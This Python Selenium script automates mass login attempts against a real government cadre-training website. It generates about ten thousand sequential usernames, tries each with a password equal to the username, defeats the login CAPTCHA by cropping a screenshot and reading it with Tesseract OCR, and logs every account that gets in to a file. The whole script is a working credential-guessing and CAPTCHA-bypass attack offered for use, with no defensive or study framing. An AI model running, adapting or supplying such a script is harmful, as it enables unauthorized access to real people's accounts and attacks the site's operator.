from selenium import webdriver
from selenium.webdriver.chrome.options import Options
import time
from PIL import Image
import pytesseract
from pytesseract import image_to_string
from selenium.common.exceptions import WebDriverException
from selenium.webdriver.common.by import By
from selenium.webdriver.common.action_chains import ActionChains

time.sleep(20)            # 等待chrome 容器先启动

src = './SXHGB/'           # 在DOCKER中路径要加上SXHGB 因为工作路径在上层文件夹


options = Options()
browser = webdriver.Remote(
    command_executor="http://chrome:4444/wd/hub",
    options=options
)

browser.implicitly_wait(60*3)

browser.maximize_window()


def login(ume: str, pwd: str, name: str = '用户'):  # 登录函数
    """
        用户登录函数
    """

    try:
        # 登录页面
        login_url = "https://www.sxgbxx.gov.cn/login"            # sxhgb首页
        browser.get(login_url)

        username = browser.find_element(By.ID, "userEmail")
        ActionChains(browser).send_keys_to_element(username, ume).perform()
        # username.send_keys(ume)  # 此处填入账号
        password = browser.find_element(By.ID, 'userPassword')
        ActionChains(browser).send_keys_to_element(password, pwd).perform()
        # ActionChains(browser).send_keys_to_element(password, pwd).perform()
        # password.send_keys(pwd)  # 此处填入密码
        # 获取截图
        browser.get_screenshot_as_file(src+'/screenshot.png')

        # 获取指定元素位置
        element = browser.find_element(By.ID, 'img')
        left = int(element.location['x'])
        top = int(element.location['y'])
        right = int(element.location['x'] + element.size['width'])
        bottom = int(element.location['y'] + element.size['height'])

        # 通过Image处理图像
        im = Image.open(src+'/screenshot.png')
        im = im.crop((left, top, right, bottom))
        im.save(src+'/random.png')

        img = Image.open(src+'/random.png')
        code = pytesseract.image_to_string(img)

        randomcode = browser.find_element(By.ID, 'randomCode')
        randomcode.send_keys(code)
        browser.find_element(By.CLASS_NAME, 'bm-lr-btn').click()

        # time.sleep(3)

        return (browser.current_url)

    except WebDriverException:
        print("webdriver 异常")


nlist = [str(i).zfill(7) for i in range(300000)]

nlist = nlist[130033:140000]

userName_list = ('u'+i for i in nlist)


for user in userName_list:

    ume, pwd, name = user, user, user

    print(name)

    url = login(ume=ume, pwd=pwd, name=name)

    if url == 'https://www.sxgbxx.gov.cn/':
        with open('user.txt', 'a') as f:
            f.write(user+'\n')
            print(f'{user} is SO SO SO lucky!!! \n')

    else:
        print(f'{user} is NOT lucky!!! \n')

        continue
